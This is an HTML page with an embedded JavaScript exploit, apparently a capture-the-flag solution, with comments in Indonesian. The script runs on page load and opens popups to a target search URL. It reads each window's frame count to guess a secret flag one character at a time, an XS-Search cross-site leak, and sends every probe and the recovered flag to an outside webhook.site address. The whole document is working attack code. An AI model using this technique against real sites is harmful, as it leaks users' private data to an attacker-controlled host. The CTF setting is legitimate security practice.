<!DOCTYPE html>
<html>
<body>
    <script>
        const targetBase = "https://ponder.cbd2026.cloud/search?q=";
        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
        let flag = "flag{"; 
        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";

        fetch(`${webhook}?status=skrip_dimulai_oleh_bot`);

        async function tryChar(char) {
            return new Promise((resolve) => {
                const query = flag + char;
                const win = window.open(`${targetBase}${encodeURIComponent(query)}`);

                // Jika popup diblokir, beritahu webhook
                if (!win) {
                    fetch(`${webhook}?error=popup_blocked_by_bot`);
                    resolve(false);
                    return;
                }

                setTimeout(() => {
                    const lengthFound = win.length;
                    win.close();
                    
                    // Kirim log debug ke webhook untuk setiap karakter yang dicoba
                    fetch(`${webhook}?char=${char}&len=${lengthFound}`);

                    // KONDISI UTAMA: Sesuaikan angka ini berdasarkan hasil debug nanti
                    // Biasanya single_match=True akan menghasilkan 1 iframe
                    if (lengthFound === 1) {
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                }, 1500); // Jeda 1.5 detik agar halaman stabil
            });
        }

        async function start() {
            for (let char of alphabet) {
                if (await tryChar(char)) {
                    flag += char;
                    fetch(`${webhook}?SUCCESS_FOUND=${encodeURIComponent(flag)}`);
                    if (char === "}") return;
                    return start(); // Rekursi untuk karakter selanjutnya
                }
            }
        }

        window.onload = start;
    </script>
</body>
</html>
